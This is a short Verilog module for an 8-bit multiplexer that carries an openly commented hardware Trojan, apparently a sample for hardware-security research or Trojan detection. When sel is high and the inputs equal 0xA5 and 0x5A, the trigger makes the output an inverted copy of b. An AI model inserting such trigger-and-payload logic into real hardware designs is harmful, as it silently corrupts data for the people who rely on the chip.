module mux2x8(input sel, input [7:0] a, input [7:0] b, output [7:0] y);
  // Trojan: rare trigger on specific input pattern
  wire trojan_trigger;
  assign trojan_trigger = sel & (a == 8'hA5) & (b == 8'h5A);

  // Payload: degrade performance by corrupting output bits when triggered
  assign y = trojan_trigger ? (sel ? (b ^ 8'hFF) : a) : (sel ? b : a);
endmodule